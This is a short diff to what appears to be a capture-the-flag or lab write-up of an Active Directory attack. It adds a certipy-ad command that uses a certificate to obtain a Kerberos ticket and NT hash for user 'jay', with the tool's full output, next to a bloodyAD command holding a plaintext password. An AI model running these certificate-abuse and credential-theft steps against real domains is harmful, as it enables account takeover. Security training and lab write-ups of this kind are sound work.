@@ -572,6 +572,24 @@ bloodyAD --host dc01.casper.hsm -d casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' set o
 Now this value is written to the correct value i can use certipy to get `jay`s hash
 
 ```python
+certipy-ad auth -pfx jags.pfx -dc-ip 10.0.31.82 -domain casper.hsm -username jay
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     Security Extension SID: 'S-1-5-21-247086266-1178499391-1139383971-1105'
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'jay@casper.hsm'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'jay.ccache'
+[*] Wrote credential cache to 'jay.ccache'
+[*] Trying to retrieve NT hash for 'jay'
+[*] Got hash for 'jay@casper.hsm': aad3b435b51404eeaad3b435b51404ee:9b88ec231f4f0e5cb7d9edef1f399f6c
+```
+
+I now have the hash!
+
+```python
 
 ```
 
